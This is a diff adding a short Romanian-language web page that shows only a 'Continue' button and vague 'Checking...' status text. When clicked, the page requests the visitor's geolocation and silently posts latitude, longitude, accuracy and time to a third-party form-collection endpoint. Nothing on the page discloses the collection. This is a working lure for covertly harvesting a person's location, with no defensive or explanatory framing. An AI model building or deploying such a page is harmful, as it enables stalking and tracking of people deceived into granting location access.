@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+  <meta charset="UTF-8">
+  <title>Continuă</title>
+</head>
+<body>
+
+<h3>Apasă pentru a continua</h3>
+<button onclick="trimiteLocatia()">Continuă</button>
+<p id="status"></p>
+
+<script>
+function trimiteLocatia() {
+  const status = document.getElementById("status");
+
+  if (!navigator.geolocation) {
+    status.innerText = "Geolocația nu este disponibilă.";
+    return;
+  }
+
+  status.innerText = "Se verifică...";
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      fetch("https://formspree.io/f/xyzzabcd", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          time: new Date().toISOString()
+        })
+      }).then(() => {
+        status.innerText = "Gata.";
+      });
+    },
+    function() {
+      status.innerText = "Acces refuzat.";
+    }
+  );
+}
+</script>
+
+</body>
+</html>
